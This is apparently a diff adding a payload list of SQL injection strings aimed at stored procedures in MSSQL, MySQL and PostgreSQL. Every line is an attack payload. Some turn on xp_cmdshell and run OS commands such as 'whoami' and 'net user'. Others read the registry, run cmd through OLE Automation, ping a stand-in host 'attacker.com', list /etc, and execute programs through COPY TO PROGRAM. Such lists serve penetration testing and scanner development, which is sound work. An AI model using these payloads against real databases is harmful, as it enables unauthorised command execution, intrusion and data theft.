@@ -1,0 +1,24 @@
+# Stored Procedure SQLi Payloads
+
+# MSSQL Extended Stored Procedures
+'; EXEC xp_cmdshell 'whoami';--
+'; EXEC xp_cmdshell 'net user';--
+'; EXEC xp_cmdshell 'dir c:\\';--
+'; EXEC master..xp_cmdshell 'ping attacker.com';--
+'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\\CurrentControlSet\\Services\\SNMP','Description';--
+'; EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;--
+
+# MSSQL OLE Automation
+'; DECLARE @o int;EXEC sp_oacreate 'wscript.shell',@o out;EXEC sp_oamethod @o,'run',NULL,'cmd /c whoami > c:\\temp.txt';--
+
+# Custom procedure injection
+'; EXEC sp_executesql N'SELECT * FROM users';--
+'; EXEC('SELECT * FROM users WHERE 1=1');--
+
+# MySQL stored procedures
+'; CALL vulnerable_proc('test');--
+' UNION SELECT * FROM mysql.proc--
+
+# PostgreSQL functions
+'; SELECT pg_ls_dir('/etc');--
+'; COPY (SELECT '') TO PROGRAM 'id';--
